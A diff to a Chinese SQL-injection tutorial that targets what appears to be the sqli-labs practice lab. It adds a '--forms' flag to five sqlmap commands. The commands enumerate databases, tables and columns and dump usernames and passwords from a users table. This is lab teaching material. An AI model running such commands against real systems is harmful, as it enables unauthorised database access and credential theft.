@@ -128,23 +128,23 @@ MySQL 的报错格式是：... right syntax to use near '<出错的SQL片段>' a
 #### (1)使用sqlmap工具自动注入(os:使用小飞机发起进攻...)
 1. 用Sqlmap查询数据库类型,输入命令：
 
-`sqlmap.py -u "http://IP/Less-1/?id=1" `
+`sqlmap.py -u "http://IP/Less-1/?id=1" --forms`
 
 2. 用Sqlmap查询所有数据库，输入命令：
 
-`sqlmap.py -u "http://IP/Less-1/?id=1" --current-db`
+`sqlmap.py -u "http://IP/Less-1/?id=1" --forms --current-db`
 
 3. 用Sqlmap查询security库的数据表,输入命令：
 
-`sqlmap.py -u "http://IP/Less-1/?id=1" --tables -D "你刚刚查到的数据库名"`
+`sqlmap.py -u "http://IP/Less-1/?id=1" --tables -D "你刚刚查到的数据库名" --forms`
 
 4. 用Sqlmap查询users表的所有列,输入命令：
 
-`sqlmap.py -u "http://IP/Less-1/?id=1"  --columns -T "users" -D "你刚刚查到的数据库名"`
+`sqlmap.py -u "http://IP/Less-1/?id=1"  --columns -T "users" -D "你刚刚查到的数据库名" --forms`
 
 5. 用Sqlmap获取列的内容,输入命令：
 
-`sqlmap.py -u "http://IP/Less-1/?id=1"  --dump -C"id,username,password" -T "users" -D "security"`
+`sqlmap.py -u "http://IP/Less-1/?id=1"  --dump -C"id,username,password" -T "users" -D "security" --forms`
 
 #### (2) 掌握手工注入的办法(os:如果你没有sqlmap工具，你要怎么发起攻击呢...?)
 ##### 1. 列字段检测
